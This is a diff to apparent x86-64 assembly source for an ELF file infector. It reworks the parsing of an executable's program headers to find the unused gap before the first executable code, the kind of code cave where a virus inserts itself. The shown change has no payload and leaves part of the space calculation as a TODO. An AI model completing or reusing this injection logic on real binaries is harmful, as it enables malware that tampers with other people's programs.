@@ -108,36 +108,64 @@ _start:
 	cmp ax, ELF_EXEC
 	jne not_exec_file
 
-	; size of program headers, to find their end
+	; Read program headers to find code start, that will be the end of our space
+
 	xor eax, eax
-	mov ax, WORD [r12+54]		; size of a program header
+	mov ax, WORD [r12+54]		; size of a program header - 56 bytes
+	mov r10, rax
 	xor ecx, ecx
-	mov cx, WORD [r12+56]		; number of program headers
-	mul ecx
-	add rax, QWORD [r12+32]		; offset of start of program headers
+	mov cx, WORD [r12+56]		; number of program headers - varies
 
-	mov [space_offset_ptr], rax
+	; interlude - compute end of program headers, that's a candidate for space start
+	mul ecx						; size of a prog header (already in rax) * num prog headers
+	add rax, QWORD [r12+32]     ; add offset of start of program headers
+	mov [space_offset_ptr], rax ; offset within file
+	add rax, r12				; add mmap address
+	mov [space_addr_ptr], rax   ; memory address (within mmap)
+	; end interlude
 
-	add rax, r12	; rax now has address of end of program headers, start of spare space
-	mov [space_addr_ptr], rax
+	mov rsi, QWORD [r12+32]		; offset of start of program headers, always 64
+	add rsi, r12                ; rsi now points at mmap first program header
+	mov r8, -1					; lowest offset so far. -1 is unsigned max
 
-	; find where space stops, which is where program starts
-	; we'll need the first LOAD program header (which comes after the ELF header)
+_next_ph:
 
-	mov eax, [r12+64]
+	; r9 = size_of_a_program_header (rdx, usually 56) * rcx (loop counter)
+	mov rax, rcx
+	dec rax
+	mul r10
+	mov r9, rax
+
+	; is it a LOAD header? we only want those
+	mov eax, [rsi+r9]
 	cmp al, PH_LOAD
-	jne not_load_program_header
+	jne _next_ph_end
 
-	; calculate: (entry point - (p_vaddr - p_offset))
-	mov rbx, [r12+72]   ; 64 + 8, elf64_phdr.p_offset (first program header)
-	mov rax, [r12+80]   ; 64 + 16, elf64_phdr.p_vaddr (first program header)
-	sub rax, rbx
-	mov rbx, [r12+24]   ; entry point as memory address (ELF header)
-	sub rbx, rax
-	mov [code_start_ptr], rbx
+	; is it at least read+execute? we only want those
+	mov eax, [rsi+r9+4]
+	and eax, 0x5
+	cmp eax, 0x5
+	jne _next_ph_end
+
+	; we found one, only keep if our best so far is bigger
+	mov rax, [rsi+r9+8]
+	cmp r8, rax
+	cmova r8, rax	; conditional move; if r8 is above the new value
+
+_next_ph_end:
+	loop _next_ph
+
+	mov [code_start_ptr], r8	; this is where the first opcode appears. our space stops here.
+
+	; TODO: compute start of space.
+	; It's the number closest to, and less than, end of space (above), from:
+	; - end of program headers (computed earlier)
+	; - iterate section headers, find closest lower sh_offset. add it's sh_size to itself.
+	;   ignore values with sh_offset of 0, and values not strictly less that 'end of space' above
+	; That's start of our space
 
 	; we can use the space between end of program headers and start of opcodes
-	mov eax, ebx
+	mov eax, [code_start_ptr]
 	sub eax, [space_offset_ptr]
 	mov [num_space_ptr], rax
 
